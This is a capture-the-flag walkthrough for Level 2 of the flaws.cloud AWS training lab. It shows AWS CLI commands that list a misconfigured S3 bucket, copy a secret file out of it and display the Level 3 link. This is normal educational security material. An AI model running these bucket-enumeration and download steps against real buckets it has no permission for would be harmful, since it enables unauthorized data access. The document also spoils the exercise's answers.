##  Level 2
URL : http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
I typed in my terminal, and was able to access the bucket

```
┌──(aaron㉿kali)-[~/cloud-hacking/level2]
└─$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud       
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html

```

> I replaced the 'http' to 's3'
> I was able to access the the s3 resource because my aws are configured
> The intended solution should to learn how to configure aws keys and we already done that in our set up

Now, we'll copy the secret again to our local machine using `cp` command

```
aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html secret.html

```

![image](https://github.com/user-attachments/assets/84e7d157-b3f9-492a-9558-2465070e381a)

Then we open the file in our terminal again using

```
                                                                                                                                                                 
┌──(aaron㉿kali)-[~/cloud-hacking/level2]
└─$ cat secret.html| html2text
                      _____  _       ____  __    __  _____
                     |     || |     /    ||  |__|  |/ ___/
                     |   __|| |    |  o  ||  |  |  (   \_
                     |  |_  | |___ |     ||  |  |  |\__  |
                     |   _] |     ||  _  ||  `  '  |/  \ |
                     |  |   |     ||  |  | \      / \    |
                     |__|   |_____||__|__|  \_/\_/   \___|
              ****** Congrats! You found the secret file! ******
Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
                                                                            
```

![image](https://github.com/user-attachments/assets/84146a37-8e1c-4fc0-9c0c-513144d2881e)
